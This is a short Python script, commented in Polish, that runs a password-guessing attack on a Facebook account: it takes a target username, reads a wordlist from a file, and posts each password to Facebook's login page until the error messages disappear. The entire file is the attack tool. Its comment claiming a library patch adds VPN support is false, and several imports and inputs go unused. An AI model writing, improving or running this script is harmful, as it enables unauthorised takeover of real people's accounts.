import requests
from requests_toolbelt.adapters import appengine

# Dodaj wsparcie dla serwera VPN
appengine.monkeypatch()

import time
import random
import re
from bcrypt import hashpw, checkpw

def verify_password(password, hashed_password):
    return checkpw(password.encode('utf-8'), hashed_password.encode('utf-8'))

def read_passwords_from_file(filename):
    with open(filename, 'r') as file:
        return file.read().splitlines()

def brute_force(username, fb_id, passwords):
    for password in passwords:
        # Wykonaj zapytanie do Facebooka przez serwer VPN
        with requests.Session() as session:
            response = session.post('https://www.facebook.com/login.php', data={
                'email': username,
                'password': password,
                'login': 'Log In'
            })

            # Sprawdź odpowiedź
            if "Nieprawidłowe hasło" not in response.text and "Spróbuj ponownie później" not in response.text:
                # Hasło zostało znalezione
                print('Znaleziono hasło:', password)
                return

            # Hasło nie zostało znalezione
            print('Nieprawidłowe hasło:', password)

            # Opóźnij przed kolejną próbą
            time.sleep(2)  # Możesz dostosować czas opóźnienia według potrzeb

def main():
    # Pobierz dane użytkownika
    username = input('Podaj nazwę użytkownika: ')
    fb_id = input('Podaj identyfikator Facebooka: ')

    # Pobierz nazwę pliku z listą haseł
    filename = input('Podaj nazwę pliku z listą haseł: ')

    # Wczytaj listę haseł z pliku
    passwords = read_passwords_from_file(filename)

    # Wykonaj atak siłowy
    brute_force(username, fb_id, passwords)

if __name__ == '__main__':
    main()














